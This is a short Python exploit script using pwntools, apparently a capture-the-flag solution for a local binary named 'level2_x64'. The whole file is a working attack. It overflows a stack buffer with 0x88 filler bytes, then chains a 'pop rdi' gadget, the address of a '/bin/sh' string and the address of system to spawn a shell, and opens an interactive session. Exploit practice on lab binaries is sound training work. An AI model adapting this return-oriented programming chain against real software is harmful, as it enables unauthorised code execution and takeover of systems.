from pwn import *

system_addr=0x000000000040063E
poprdi_drt=0x00000000004006b3
binsh_addr=0x0000000000600A90
io = process("./level2_x64")
io.recvline()
payload=b'A'*0x80+b"A"*8+p64(poprdi_drt)+p64(binsh_addr)+p64(system_addr)
io.send(payload)
io.interactive()
